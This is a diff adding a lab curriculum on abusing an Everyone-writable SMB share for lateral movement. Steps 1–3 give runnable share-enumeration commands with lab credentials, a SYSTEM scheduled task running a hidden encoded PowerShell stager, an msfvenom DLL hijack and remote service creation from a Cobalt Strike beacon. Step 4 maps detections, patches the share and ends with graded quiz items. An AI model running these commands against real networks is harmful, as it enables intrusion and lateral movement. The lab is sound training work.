@@ -278,4 +278,291 @@ cost:
   cpu_pct: 0
   detectability: medium
 
+curriculum:
+  title: "Writable SMB Share — Lateral movement landing pad"
+  summary: >
+    Guided walkthrough of an Everyone-writable SMB share on tlms01. You
+    will enumerate shares using smbmap, crackmapexec, PowerView's
+    Find-DomainShare, and a CS BOF; write a payload to the share; trigger
+    remote execution via scheduled task or DLL hijack; and walk the
+    Elastic detections that fire on the write+execute chain.
+  learning_objectives:
+    - "Enumerate SMB shares and their effective permissions from Linux and Windows attacker contexts."
+    - "Distinguish share-level ACLs from NTFS DACLs (both must allow access)."
+    - "Plant a payload on a writable share and trigger execution via three independent vectors (schtask XML, DLL search-order hijack, Startup folder)."
+    - "Map writable-share telemetry to the canonical lateral-movement Elastic detections."
+  prerequisites:
+    - "Beacon on tlws01 as TESTLAB\\jdoe (low-priv domain user)"
+    - "Kali at 192.168.1.100 with smbmap, crackmapexec, and Impacket installed"
+    - "writable-share-everyone bolt-on installed on tlms01 (PublicShare exposed)"
+  estimated_total_minutes: 35
+  steps:
+    - id: "01-enum-from-linux"
+      title: "Enumerate writable shares from Kali"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Find the share + confirm effective permissions
+
+        Two distinct ACLs need to align for write access:
+
+        1. **Share-level ACL** (SMB-layer, set via `Grant-SmbShareAccess`)
+        2. **NTFS DACL** on the backing folder
+
+        Both must permit your principal. Enumerate from Kali as
+        TESTLAB\jdoe:
+
+        ```bash
+        # smbmap — fastest share+permission view
+        smbmap -H 10.99.50.11 -u jdoe -p 'Welcome1!' -d testlab.local
+        # Expected:
+        # Disk          Permissions   Comment
+        # ----          -----------   -------
+        # ADMIN$        NO ACCESS     Remote Admin
+        # C$            NO ACCESS     Default share
+        # IPC$          READ ONLY     Remote IPC
+        # NETLOGON      READ ONLY     Logon server share
+        # PublicShare   READ, WRITE   Lab bolt-on writable share — DO NOT USE IN PROD
+        # SYSVOL        READ ONLY     Logon server share
+        ```
+
+        ```bash
+        # crackmapexec / netexec — bulk share enumeration across a subnet
+        netexec smb 10.99.50.0/24 -u jdoe -p 'Welcome1!' -d testlab.local --shares
+        # Returns every host's share list + per-share R/W flag
+        ```
+
+        ```bash
+        # List share contents to confirm read works
+        smbclient //10.99.50.11/PublicShare -U testlab.local/jdoe%'Welcome1!' -c "ls"
+        ```
+
+        > **Detection callout** — Share enumeration via SMB is mostly
+        > below detection threshold (legitimate users enumerate shares
+        > all day). EID 5140 (network share accessed) fires but is
+        > normally tuned out.
+    - id: "02-enum-from-windows"
+      title: "PowerView and CS BOF from inside the network"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 2 — Enumerate from the tlws01 beacon
+
+        From the beacon, three independent paths to the same data.
+
+        ### PowerView
+
+        ```powershell
+        Import-Module .\PowerView.ps1
+        Find-DomainShare -ComputerName tlms01.testlab.local -CheckShareAccess
+        # CheckShareAccess filters to shares the current user can READ
+        ```
+
+        ```powershell
+        # Domain-wide writable-share hunt
+        Find-DomainShare -CheckShareAccess |
+          Where-Object { $_.Type -eq 0 }   # Disk shares only, exclude IPC$/print
+        ```
+
+        ### CS BOF — `findshares.x64.o`
+
+        ```
+        beacon> inline-execute /opt/bofs/findshares.x64.o tlms01.testlab.local
+        [+] \\tlms01.testlab.local\PublicShare  (DISKTREE)  - "Lab bolt-on writable share"
+        [+] \\tlms01.testlab.local\NETLOGON     (DISKTREE)
+        ```
+
+        ### Native net.exe
+
+        ```cmd
+        net view \\tlms01.testlab.local
+        net use Z: \\tlms01.testlab.local\PublicShare
+        dir Z:\
+        ```
+
+        > **Detection callout** — *Suspicious PowerShell ScriptBlock —
+        > PowerView Loaded* (EID 4104) fires when `Find-DomainShare` or
+        > other PowerView functions execute. The BOF variant avoids this.
+    - id: "03-plant-payload-vectors"
+      title: "Plant payloads — three execution vectors"
+      estimated_minutes: 12
+      markdown: |
+        ## Step 3 — Plant + trigger lateral movement
+
+        Three independent execution vectors. Pick whichever matches the
+        target environment.
+
+        ### Vector A — Scheduled Task XML drop (T1053.005)
+
+        Create a task XML on Kali:
+
+        ```bash
+        cat > /tmp/PublicTask.xml <<'XML'
+        <?xml version="1.0" encoding="UTF-16"?>
+        <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+          <Triggers>
+            <TimeTrigger>
+              <StartBoundary>2026-05-28T12:00:00</StartBoundary>
+              <Enabled>true</Enabled>
+            </TimeTrigger>
+          </Triggers>
+          <Principals>
+            <Principal id="Author">
+              <UserId>S-1-5-18</UserId>
+              <RunLevel>HighestAvailable</RunLevel>
+            </Principal>
+          </Principals>
+          <Actions Context="Author">
+            <Exec>
+              <Command>powershell.exe</Command>
+              <Arguments>-NoP -W Hidden -Enc &lt;base64-stager&gt;</Arguments>
+            </Exec>
+          </Actions>
+        </Task>
+        XML
+
+        # Drop on share + register on tlms01 via schtasks
+        smbclient //10.99.50.11/PublicShare -U testlab.local/jdoe%'Welcome1!' \
+            -c "put /tmp/PublicTask.xml PublicTask.xml"
+
+        # Then from the beacon on tlws01 (must have CreateTask rights on tlms01):
+        # schtasks /create /S tlms01 /XML \\tlms01\PublicShare\PublicTask.xml /TN MyTask /F
+        ```
+
+        ### Vector B — DLL search-order hijack
+
+        If a service or app on tlms01 loads DLLs without a fully-qualified
+        path and walks the search order through the writable share (rare
+        but seen with custom apps + UNC working directories):
+
+        ```bash
+        # Build the DLL on Kali
+        msfvenom -p windows/x64/exec CMD='powershell -Enc <stager>' \
+            -f dll -o /tmp/version.dll
+        smbclient //10.99.50.11/PublicShare -U testlab.local/jdoe%'Welcome1!' \
+            -c "put /tmp/version.dll version.dll"
+        ```
+
+        ### Vector C — User-startup folder write (T1547.001)
+
+        If the share happens to be (or contains) a user's Startup folder
+        (unusual default, common in roaming-profile setups):
+
+        ```bash
+        smbclient //10.99.50.11/PublicShare -U testlab.local/jdoe%'Welcome1!' \
+            -c "put /tmp/run_on_login.lnk Reports/run_on_login.lnk"
+        ```
+
+        Fires on next interactive logon by any user whose Startup links
+        resolve from that share.
+
+        ### Vector D — CS BOF: write-execute from beacon
+
+        ```
+        beacon> upload /tmp/payload.exe
+        beacon> shell copy beacon-out\payload.exe \\tlms01.testlab.local\PublicShare\update.exe
+        beacon> shell sc \\tlms01 create LabUpdater binPath= "\\tlms01\PublicShare\update.exe"
+        beacon> shell sc \\tlms01 start LabUpdater
+        ```
+
+        > **Detection callout** — *Remote Execution via File Shares*
+        > (`ab75c24b-2502-43a0-bf7c-e60e662c811e`) is purpose-built for
+        > this exact write-then-execute sequence. It correlates a remote
+        > file write (EID 5145 on the share) with a subsequent service or
+        > task creation on the same host within a short window.
+      assessment:
+        question: "Vector A (schtask XML drop) requires a *separate* primitive to register the task remotely. Why isn't dropping the XML on the share enough?"
+        options:
+          - "Windows Task Scheduler doesn't auto-import XML files from arbitrary disk locations — it requires schtasks /create or a registry write under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks. Both need a separate execution primitive."
+          - "The XML is encrypted on disk."
+          - "Task Scheduler only reads from C:\\Windows\\System32\\Tasks."
+          - "Tasks require admin to even drop the XML."
+        correct_index: 0
+        explanation: >
+          Dropping XML on a share creates a file, nothing more. Windows
+          imports tasks via the Task Scheduler service API (schtasks.exe
+          /create /XML, or PowerShell Register-ScheduledTask, or a write
+          to the protected TaskCache registry path which itself requires
+          SYSTEM). The share is the staging ground; you need a separate
+          remote-execution primitive (WMI, schtasks /S, PsExec, etc.) to
+          turn the dropped XML into a registered task.
+    - id: "04-detection-and-patch"
+      title: "Detection mapping + patch"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 4 — What the SOC sees + harden
+
+        Open Kibana (https://10.99.50.13:5601), filter `host.name :
+        tlms01` for the past hour. Expected hits from Steps 3.A and 3.D:
+
+        | Phase | Rule | Source event |
+        |---|---|---|
+        | Share creation | Windows Event 5142 — network share created | bolt-on install |
+        | Write to share | Sysmon EID 11 — FileCreate under C:\PublicShare from remote user | Steps 3.A/B/C/D |
+        | Write+execute  | Remote Execution via File Shares | sequence rule: 5145 write + 4697 service install OR 4698 task create |
+        | Task registered | Suspicious Scheduled Task Created (built-in) | EID 4698 |
+
+        The single highest-fidelity signal is the **sequence rule** —
+        independent file-writes are noisy on prod file servers, but a
+        write immediately followed by a service/task creation referencing
+        the written path is extremely high-confidence lateral movement.
+
+        **Mitigation** — click **Patch**. The patch:
+
+        1. Replaces share-level Everyone:Full with Administrators:Full +
+           Authenticated Users:Read
+        2. Removes the NTFS Everyone:Modify ACE
+        3. Grants Administrators FullControl with inheritance
+        4. Adds an audit SACL on `C:\PublicShare` for WriteData +
+           ChangePermissions by anyone (Success+Failure)
+
+        Verify:
+
+        ```powershell
+        Get-SmbShareAccess -Name 'PublicShare'
+        # Expected:
+        # Name        AccountName            AccessControlType  AccessRight
+        # ----        -----------            -----------------  -----------
+        # PublicShare BUILTIN\Administrators Allow              Full
+        # PublicShare NT AUTHORITY\Authenticated Users  Allow   Read
+
+        (Get-Acl 'C:\PublicShare').Access | Format-Table IdentityReference, FileSystemRights
+        # No "Everyone" line should appear with Modify or higher
+        ```
+
+        Re-run Step 3.A's `smbclient put`:
+
+        ```
+        $ smbclient //10.99.50.11/PublicShare -U testlab.local/jdoe%'Welcome1!' \
+            -c "put /tmp/test.txt test.txt"
+        NT_STATUS_ACCESS_DENIED opening remote file \test.txt
+        ```
+
+        Share is now read-only for non-admins; lateral landing pad closed.
+
+        ### Defensive guidance for the org
+
+        - Run `Get-SmbShare | Get-SmbShareAccess | Where-Object {
+          $_.AccountName -eq 'Everyone' }` across every member server
+        - Replace Everyone with Authenticated Users at minimum; reserve
+          Full Control for Administrators
+        - Audit SACLs on every share that legitimately needs writable
+          access (e.g. Reports drops, deploy stagers)
+        - Pair with the smb-signing bolt-on so cross-host SMB sessions
+          can't be hijacked even if write is permitted
+      assessment:
+        question: "Why does the patch keep Authenticated Users:Read at the share level instead of removing Everyone entirely with no replacement?"
+        options:
+          - "Removing all non-admin access would break the legitimate Reports drop workflow the share exists for. Authenticated Users:Read lets the team continue to consume reports while removing the lateral-movement primitive (write access). Apply least privilege — don't lock out users who have a legitimate need."
+          - "Windows requires at least one non-admin ACE on every share."
+          - "Authenticated Users is an alias for Administrators."
+          - "It's a Microsoft licensing requirement."
+        correct_index: 0
+        explanation: >
+          Patches that over-tighten get reverted by the team that owns
+          the workflow. The right fix is least privilege: identify
+          what the share legitimately needs (read for the team) and
+          remove what it doesn't (write for everyone). Read-only access
+          for Authenticated Users + audit SACL on writes catches both
+          intended-use reads AND any attempt at the old lateral-movement
+          primitive, all without breaking the business workflow.
+
 status: stable
